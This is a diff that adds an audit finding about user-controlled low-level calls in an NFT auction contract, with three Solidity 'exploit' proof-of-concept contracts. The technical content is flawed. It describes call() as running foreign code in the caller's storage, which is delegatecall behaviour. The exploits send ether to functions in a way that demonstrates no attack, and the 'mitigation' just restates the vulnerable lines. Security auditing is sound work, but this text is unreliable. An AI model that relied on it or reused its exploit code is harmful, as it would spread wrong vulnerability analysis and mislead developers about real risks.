@@ -971,3 +971,155 @@ Do not allow user-controlled data inside the call() function.
 // Ln 82
         (bool success, ) = payable(admin).call{value: balance}("");
 ```
+## [L-17] Controlled low level call
+## Impact
+The contract is using call() which is accepting address controlled by a user. 
+This can have devastating effects on the contract as a call allows the contract to execute code belonging to other contracts but using it’s own storage. 
+This can very easily lead to a loss of funds and compromise of the contract.
+
+## Proof of Concept
+**Vulnerable claimAuction function**
+```sol
+// Ln 104-120
+    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
+        require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
+        auctionClaim[_tokenid] = true;
+        uint256 highestBid = returnHighestBid(_tokenid);
+        address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
+        address highestBidder = returnHighestBidder(_tokenid);
+        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
+            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
+                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
+                (bool success, ) = payable(owner()).call{value: highestBid}("");
+                emit ClaimAuction(owner(), _tokenid, success, highestBid);
+            } else if (auctionInfoData[_tokenid][i].status == true) {
+                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
+            } else {}
+        }
+    }
+```
+**Exploit claimAuction low level call**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./auctionDemo.sol";
+
+contract tauctionDemo {
+
+   auctionDemo public x1;
+
+   constructor(auctionDemo _x1) {
+
+      x1 = auctionDemo(_x1);
+
+   }
+
+   function testLowCal() public payable {
+
+      x1.claimAuction{value: 2 ether}(uint256(12));
+
+   }
+
+   receive() external payable {}
+
+   }
+```
+**Vulnerable cancelBid function**
+```sol
+// Ln 124-130
+    function cancelBid(uint256 _tokenid, uint256 index) public {
+        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
+        require(auctionInfoData[_tokenid][index].bidder == msg.sender && auctionInfoData[_tokenid][index].status == true);
+        auctionInfoData[_tokenid][index].status = false;
+        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
+        emit CancelBid(msg.sender, _tokenid, index, success, auctionInfoData[_tokenid][index].bid);
+    }
+```
+**Exploit cancelBid function with low level call**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./auctionDemo.sol";
+
+contract tauctionDemo {
+
+   auctionDemo public x1;
+
+   constructor(auctionDemo _x1) {
+
+      x1 = auctionDemo(_x1);
+
+   }
+
+   function testLowCalB() public payable {
+
+      x1.cancelBid{value: 2 ether}(uint256(24), uint256(12));
+
+   }
+
+   receive() external payable {}
+
+   }
+```
+**Vulnerable cancelAllBids function**
+```sol
+// Ln 134-143
+    function cancelAllBids(uint256 _tokenid) public {
+        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
+        for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {
+            if (auctionInfoData[_tokenid][i].bidder == msg.sender && auctionInfoData[_tokenid][i].status == true) {
+                auctionInfoData[_tokenid][i].status = false;
+                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+                emit CancelBid(msg.sender, _tokenid, i, success, auctionInfoData[_tokenid][i].bid);
+            } else {}
+        }
+    }
+```
+**Exploit cancelAllBids function with low level call**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./auctionDemo.sol";
+
+contract tauctionDemo {
+
+   auctionDemo public x1;
+
+   constructor(auctionDemo _x1) {
+
+      x1 = auctionDemo(_x1);
+
+   }
+
+   function testLowCalD() public payable {
+
+      x1.cancelAllBids{value: 2 ether}(uint256(24));
+   }
+
+   receive() external payable {}
+
+   }
+```
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+Do not allow user-controlled data inside the call() function.
+```sol
+// Ln 116        
+(bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+```
+```sol
+// Ln 128
+        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
+```
+```sol
+// Ln 139
+                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+```
